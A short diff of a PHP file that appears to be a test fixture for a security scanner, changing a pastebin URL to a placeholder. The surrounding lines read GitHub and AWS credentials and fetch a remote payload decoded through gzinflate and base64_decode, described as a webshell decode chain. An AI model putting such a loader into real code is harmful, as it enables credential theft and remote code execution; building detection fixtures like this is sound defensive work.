@@ -22,7 +22,7 @@ $token   = getenv("GITHUB_TOKEN");
 $awsKey  = $_ENV["AWS_ACCESS_KEY_ID"];
 $awsSec  = $_SERVER["HTTP_AUTHORIZATION"];
 
-$payload = file_get_contents("https://pastebin.com/raw/abc123");
+$payload = file_get_contents("https://pastebin.com/raw/aegis-test-fixture-not-a-real-paste");
 
 // Canonical webshell decode chain.
 $decoded = gzinflate(base64_decode($payload));
